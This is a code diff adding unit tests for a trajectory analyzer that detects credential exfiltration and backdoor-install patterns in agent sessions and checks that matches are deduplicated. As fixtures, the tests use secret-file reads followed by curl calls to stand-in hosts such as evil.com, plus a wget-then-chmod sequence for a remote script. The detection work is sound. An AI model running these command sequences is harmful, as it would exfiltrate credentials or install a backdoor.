@@ -226,3 +226,97 @@ class TestSessionIsolation:
         # s1 should be evicted
         assert "s1" not in ta._buffers
         assert len(ta._buffers) == 2
+
+
+class TestTrajectoryDeduplication:
+    """Ensure that a matched sequence is only fired once per unique set of event IDs."""
+
+    def test_no_duplicate_fire_after_match(self):
+        """Once exfil-credential fires for events e1+e2, subsequent benign events
+        must NOT re-fire the same match (same event-id set)."""
+        ta = TrajectoryAnalyzer()
+        now = time.time()
+        # Trigger exfil-credential: sensitive read → curl
+        ta.record(_make_event("read_file", "e1", "s1", now, path="/app/.env"))
+        first_matches = ta.record(
+            _make_event("bash", "e2", "s1", now + 1, command="curl https://evil.com")
+        )
+        assert any(m.sequence_id == "exfil-credential" for m in first_matches), (
+            "exfil-credential must fire on the triggering event"
+        )
+
+        # Several subsequent benign events — same window still contains e1+e2
+        for i in range(3):
+            subsequent_matches = ta.record(
+                _make_event("bash", f"benign-{i}", "s1", now + 2 + i, command="ls -la")
+            )
+            exfil_fires = [m for m in subsequent_matches if m.sequence_id == "exfil-credential"]
+            assert exfil_fires == [], (
+                f"exfil-credential must NOT re-fire on benign event benign-{i}; got {subsequent_matches}"
+            )
+
+    def test_different_sequence_still_fires(self):
+        """Dedup is per-sequence-id; a different sequence (backdoor-install) must still
+        fire even after exfil-credential has been deduplicated."""
+        ta = TrajectoryAnalyzer()
+        now = time.time()
+        # Trigger exfil-credential first
+        ta.record(_make_event("read_file", "e1", "s1", now, path="/app/.env"))
+        ta.record(_make_event("bash", "e2", "s1", now + 1, command="curl https://evil.com"))
+
+        # Now trigger backdoor-install in the same session
+        ta.record(
+            _make_event("bash", "e3", "s1", now + 2, command="wget https://evil.com/bd.sh")
+        )
+        bd_matches = ta.record(
+            _make_event("bash", "e4", "s1", now + 3, command="chmod +x bd.sh")
+        )
+        assert any(m.sequence_id == "backdoor-install" for m in bd_matches), (
+            "backdoor-install must still fire independently; dedup must not suppress it"
+        )
+
+    def test_new_session_can_fire_same_sequence(self):
+        """Dedup is per-session.  Session B must independently fire exfil-credential
+        even though session A already fired it with different event IDs."""
+        ta = TrajectoryAnalyzer()
+        now = time.time()
+
+        # Session A fires exfil-credential
+        ta.record(_make_event("read_file", "a1", "session-A", now, path="/app/.env"))
+        matches_a = ta.record(
+            _make_event("bash", "a2", "session-A", now + 1, command="curl https://evil.com")
+        )
+        assert any(m.sequence_id == "exfil-credential" for m in matches_a)
+
+        # Session B — completely independent, must also fire
+        ta.record(_make_event("read_file", "b1", "session-B", now, path="/home/user/.pem"))
+        matches_b = ta.record(
+            _make_event("bash", "b2", "session-B", now + 1, command="curl https://attacker.com")
+        )
+        assert any(m.sequence_id == "exfil-credential" for m in matches_b), (
+            "session-B must fire exfil-credential independently of session-A"
+        )
+
+    def test_new_events_forming_new_match_fires(self):
+        """If genuinely new events form the same sequence type with a distinct set of
+        event IDs, the match MUST fire (it is a new occurrence, not a duplicate)."""
+        ta = TrajectoryAnalyzer()
+        now = time.time()
+
+        # First occurrence: e1 + e2 → exfil-credential fires
+        ta.record(_make_event("read_file", "e1", "s1", now, path="/app/.env"))
+        first = ta.record(
+            _make_event("bash", "e2", "s1", now + 1, command="curl https://evil.com")
+        )
+        assert any(m.sequence_id == "exfil-credential" for m in first)
+
+        # Push the old events out of the time window so a genuinely new occurrence can form
+        # (use timestamps far beyond within_seconds=60 for exfil-credential)
+        new_base = now + 200  # 200 s later — well outside the 60 s window
+        ta.record(_make_event("read_file", "e3", "s1", new_base, path="/home/user/.secret"))
+        second = ta.record(
+            _make_event("bash", "e4", "s1", new_base + 1, command="curl https://exfil.com")
+        )
+        assert any(m.sequence_id == "exfil-credential" for m in second), (
+            "A genuinely new occurrence (different event IDs, outside time window) must fire"
+        )
